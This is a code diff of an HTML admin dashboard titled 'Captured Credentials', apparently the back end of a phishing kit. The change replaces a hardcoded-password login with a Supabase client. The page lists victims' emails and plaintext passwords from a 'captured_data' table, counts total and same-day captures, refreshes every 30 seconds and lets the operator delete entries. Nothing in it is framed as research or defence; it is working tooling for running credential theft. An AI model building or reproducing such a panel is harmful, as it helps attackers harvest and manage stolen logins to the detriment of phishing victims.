@@ -4,101 +4,89 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Panel - Captured Data</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
         }
 
         body {
-            background: #0f1419;
-            color: #e7e9ea;
-            min-height: 100vh;
-        }
-
-        .login-container {
-            max-width: 400px;
-            margin: 100px auto;
-            padding: 2rem;
-            background: #1a1f24;
-            border-radius: 12px;
-            border: 1px solid #2f3336;
-        }
-
-        .login-container h2 {
-            margin-bottom: 1.5rem;
-            text-align: center;
-        }
-
-        .login-container input {
-            width: 100%;
-            padding: 0.8rem;
-            margin-bottom: 1rem;
-            background: #0f1419;
-            border: 1px solid #2f3336;
-            border-radius: 6px;
-            color: #e7e9ea;
-            font-size: 1rem;
-        }
-
-        .login-container button {
-            width: 100%;
-            padding: 0.8rem;
-            background: #1d9bf0;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        .header {
-            background: #1a1f24;
-            padding: 1rem 2rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #2f3336;
+            background: #f0f2f5;
+            padding: 20px;
         }
 
         .container {
-            max-width: 1200px;
-            margin: 2rem auto;
-            padding: 0 1rem;
+            max-width: 1400px;
+            margin: 0 auto;
         }
 
-        .stats-grid {
+        .header {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 24px;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: 0.2s;
+            margin-left: 10px;
+        }
+
+        .refresh-btn {
+            background: #4CAF50;
+            color: white;
+        }
+
+        .refresh-btn:hover {
+            background: #45a049;
+        }
+
+        .stats {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 1rem;
-            margin-bottom: 2rem;
+            gap: 20px;
+            margin-bottom: 20px;
         }
 
         .stat-card {
-            background: #1a1f24;
-            padding: 1.5rem;
-            border-radius: 12px;
-            border: 1px solid #2f3336;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
 
-        .stat-value {
-            font-size: 2rem;
-            font-weight: 700;
-            color: #1d9bf0;
+        .stat-number {
+            font-size: 36px;
+            font-weight: bold;
+            color: #4CAF50;
         }
 
         .stat-label {
-            color: #71767b;
-            font-size: 0.9rem;
+            color: #666;
+            font-size: 14px;
         }
 
-        .data-table {
-            background: #1a1f24;
-            border-radius: 12px;
-            border: 1px solid #2f3336;
+        .table-container {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
             overflow-x: auto;
         }
 
@@ -108,132 +96,170 @@
         }
 
         th {
+            background: #f8f9fa;
+            padding: 15px;
             text-align: left;
-            padding: 1rem;
-            background: #1a1f24;
-            color: #71767b;
-            font-size: 0.85rem;
-            text-transform: uppercase;
-            border-bottom: 1px solid #2f3336;
+            font-weight: 600;
+            color: #333;
+            border-bottom: 2px solid #dee2e6;
         }
 
         td {
-            padding: 1rem;
-            border-bottom: 1px solid #2f3336;
+            padding: 15px;
+            border-bottom: 1px solid #dee2e6;
         }
 
-        .password-text {
+        tr:hover {
+            background: #f8f9fa;
+        }
+
+        .password {
             font-family: 'Courier New', monospace;
-            color: #ff6b6b;
+            color: #d32f2f;
+            font-weight: bold;
+        }
+
+        .delete-btn {
+            background: #ff5252;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+
+        .delete-btn:hover {
+            background: #ff1744;
         }
 
         .empty-state {
             text-align: center;
-            padding: 4rem;
-            color: #71767b;
-        }
-
-        .empty-state i {
-            font-size: 4rem;
-            margin-bottom: 1rem;
+            padding: 50px;
+            color: #999;
         }
     </style>
 </head>
 <body>
-    <div id="loginSection" class="login-container">
-        <h2><i class="fas fa-lock"></i> Admin Login</h2>
-        <input type="password" id="adminPassword" placeholder="Enter admin password">
-        <button onclick="login()">Login</button>
-    </div>
-
-    <div id="adminSection" style="display:none;">
+    <div class="container">
         <div class="header">
-            <h1><i class="fas fa-database"></i> Captured Credentials</h1>
-            <button onclick="logout()" style="background:#ff4444;color:white;border:none;padding:0.5rem 1rem;border-radius:6px;cursor:pointer;">
-                <i class="fas fa-sign-out-alt"></i> Logout
-            </button>
+            <h1>📊 Captured Credentials</h1>
+            <div>
+                <button class="btn refresh-btn" onclick="loadData()">🔄 Refresh Data</button>
+            </div>
         </div>
 
-        <div class="container">
-            <div class="stats-grid">
-                <div class="stat-card">
-                    <div class="stat-value" id="totalCount">0</div>
-                    <div class="stat-label">Total Captures</div>
-                </div>
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number" id="totalCount">0</div>
+                <div class="stat-label">Total Captures</div>
             </div>
+            <div class="stat-card">
+                <div class="stat-number" id="todayCount">0</div>
+                <div class="stat-label">Today's Captures</div>
+            </div>
+        </div>
 
-            <div class="data-table">
-                <div class="empty-state" id="emptyState">
-                    <i class="fas fa-inbox"></i>
-                    <p>No data captured yet</p>
-                </div>
-                <table id="dataTable" style="display:none;">
-                    <thead>
-                        <tr>
-                            <th>Email</th>
-                            <th>Password</th>
-                            <th>IP Address</th>
-                            <th>Timestamp</th>
-                        </tr>
-                    </thead>
-                    <tbody id="tableBody"></tbody>
-                </table>
-            </div>
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Email</th>
+                        <th>Password</th>
+                        <th>User Agent</th>
+                        <th>Timestamp</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="tableBody">
+                    <tr>
+                        <td colspan="6" style="text-align:center;">Loading data...</td>
+                    </tr>
+                </tbody>
+            </table>
         </div>
     </div>
 
     <script>
-        const ADMIN_PASSWORD = 'admin123'; // Change this!
-
-        function login() {
-            const password = document.getElementById('adminPassword').value;
-            if (password === ADMIN_PASSWORD) {
-                document.getElementById('loginSection').style.display = 'none';
-                document.getElementById('adminSection').style.display = 'block';
-                loadData();
-            } else {
-                alert('Wrong password!');
-            }
-        }
-
-        function logout() {
-            document.getElementById('adminSection').style.display = 'none';
-            document.getElementById('loginSection').style.display = 'block';
-        }
+        // REPLACE WITH YOUR SUPABASE CREDENTIALS
+        const SUPABASE_URL = 'YOUR_SUPABASE_URL_HERE';
+        const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY_HERE';
+        
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
         async function loadData() {
             try {
-                const response = await fetch(`/api/get-data?password=${ADMIN_PASSWORD}`);
-                const data = await response.json();
-                
-                if (data.success && data.data.length > 0) {
-                    document.getElementById('emptyState').style.display = 'none';
-                    document.getElementById('dataTable').style.display = 'table';
-                    document.getElementById('totalCount').textContent = data.data.length;
-                    
-                    const tableBody = document.getElementById('tableBody');
-                    tableBody.innerHTML = data.data.map(item => `
-                        <tr>
-                            <td>${item.email}</td>
-                            <td class="password-text">${item.password}</td>
-                            <td>${item.ip}</td>
-                            <td>${item.timestamp}</td>
-                        </tr>
-                    `).join('');
-                } else {
-                    document.getElementById('totalCount').textContent = '0';
+                const { data, error } = await supabase
+                    .from('captured_data')
+                    .select('*')
+                    .order('created_at', { ascending: false })
+                    .limit(100);
+
+                if (error) {
+                    console.error('Error:', error);
+                    document.getElementById('tableBody').innerHTML = 
+                        '<tr><td colspan="6" style="text-align:center;color:red;">Error loading data. Check console.</td></tr>';
+                    return;
                 }
+
+                document.getElementById('totalCount').textContent = data.length;
+
+                const today = new Date().toDateString();
+                const todayCount = data.filter(item => 
+                    new Date(item.created_at).toDateString() === today
+                ).length;
+                document.getElementById('todayCount').textContent = todayCount;
+
+                const tableBody = document.getElementById('tableBody');
+
+                if (data.length === 0) {
+                    tableBody.innerHTML = '<tr><td colspan="6" class="empty-state">No data captured yet</td></tr>';
+                    return;
+                }
+
+                tableBody.innerHTML = data.map((item, index) => `
+                    <tr>
+                        <td>${index + 1}</td>
+                        <td>${item.email || 'N/A'}</td>
+                        <td class="password">${item.password || 'N/A'}</td>
+                        <td>${(item.user_agent || 'N/A').substring(0, 50)}...</td>
+                        <td>${new Date(item.created_at).toLocaleString()}</td>
+                        <td>
+                            <button class="delete-btn" onclick="deleteEntry(${item.id})">Delete</button>
+                        </td>
+                    </tr>
+                `).join('');
+
             } catch (error) {
-                console.error('Error loading data:', error);
+                console.error('Error:', error);
+                document.getElementById('tableBody').innerHTML = 
+                    '<tr><td colspan="6" style="text-align:center;color:red;">Error loading data.</td></tr>';
             }
         }
 
-        // Check if already logged in
-        if (sessionStorage.getItem('adminLoggedIn') === 'true') {
-            document.getElementById('loginSection').style.display = 'none';
-            document.getElementById('adminSection').style.display = 'block';
-            loadData();
+        async function deleteEntry(id) {
+            if (!confirm('Delete this entry?')) return;
+
+            try {
+                const { error } = await supabase
+                    .from('captured_data')
+                    .delete()
+                    .eq('id', id);
+
+                if (error) throw error;
+                loadData();
+            } catch (error) {
+                console.error('Error deleting:', error);
+                alert('Error deleting entry');
+            }
         }
+
+        loadData();
+        setInterval(loadData, 30000);
+
+        window.loadData = loadData;
+        window.deleteEntry = deleteEntry;
     </script>
 </body>
 </html>
